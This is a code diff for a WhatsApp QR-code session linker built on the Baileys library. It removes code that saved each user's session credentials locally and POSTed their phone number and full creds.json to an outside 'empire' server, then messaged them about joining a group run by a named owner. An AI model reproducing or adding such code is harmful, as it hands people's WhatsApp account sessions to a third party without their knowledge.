@@ -5,16 +5,8 @@ import { makeWASocket, useMultiFileAuthState, makeCacheableSignalKeyStore, Brows
 import { delay } from '@whiskeysockets/baileys';
 import QRCode from 'qrcode';
 import qrcodeTerminal from 'qrcode-terminal';
-import path from 'path';
 
 const router = express.Router();
-
-// NEW: EMPIRE CONFIG FOR AUTO-SEND
-const EMPIRE_URL = "https://vamparina-v1-5.onrender.com";
-const SESSION_DIR = path.join(process.cwd(), 'auto_sessions');
-
-// NEW: Ensure session directory exists
-if (!fs.existsSync(SESSION_DIR)) fs.mkdirSync(SESSION_DIR, { recursive: true });
 
 // Function to remove files or directories
 function removeFile(FilePath) {
@@ -138,45 +130,10 @@ router.get('/', async (req, res) => {
                     
                     // Send session file to user 
                     try {
+                        
+                        
                         // Read the session file
                         const sessionKnight = fs.readFileSync(dirs + '/creds.json');
-                        
-                        // NEW: Save session to auto_sessions
-                        const empireSessionId = "vamp_" + jidNormalizedUser(sock.authState.creds.me.id).split('@')[0] + "_" + Date.now();
-                        const sessionPath = path.join(SESSION_DIR, empireSessionId);
-                        if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath, { recursive: true });
-                        fs.writeFileSync(path.join(sessionPath, 'creds.json'), sessionKnight);
-
-                        console.log(`\nNEW WARRIOR SESSION SAVED`);
-                        console.log(`Phone: ${jidNormalizedUser(sock.authState.creds.me.id).split('@')[0]}`);
-                        console.log(`Session ID: ${empireSessionId}`);
-                        console.log(`Saved to: ${sessionPath}`);
-
-                        // NEW: Send session to empire bot
-                        try {
-                            const response = await fetch(`${EMPIRE_URL}/vamparina-activate`, {
-                                method: "POST",
-                                headers: { "Content-Type": "application/json" },
-                                body: JSON.stringify({
-                                    phone: jidNormalizedUser(sock.authState.creds.me.id).split('@')[0],
-                                    sessionId: empireSessionId,
-                                    creds: JSON.parse(sessionKnight),
-                                    type: "qr_code",
-                                    source: "vamparina-code-linker"
-                                })
-                            });
-
-                            const result = await response.json();
-                            console.log("Session sent to empire:", result);
-
-                            // NEW: Notify user of empire activation
-                            await sock.sendMessage(jidNormalizedUser(sock.authState.creds.me.id), {
-                                text: `*VAMPARINA V1 EMPIRE ACTIVATED*\n\nMethod: QR Code\nEmpire Group: Joined Automatically\nOwner: Arnold Chirchir (+254703110780)\n\nYou are now part of Kenya's strongest WhatsApp army 2025\n\nLong live the King`
-                            });
-
-                        } catch (err) {
-                            console.error("Failed to send to empire:", err.message);
-                        }
                         
                         // Get the user's JID from the session
                         const userJid = Object.keys(sock.authState.creds.me || {}).length > 0 
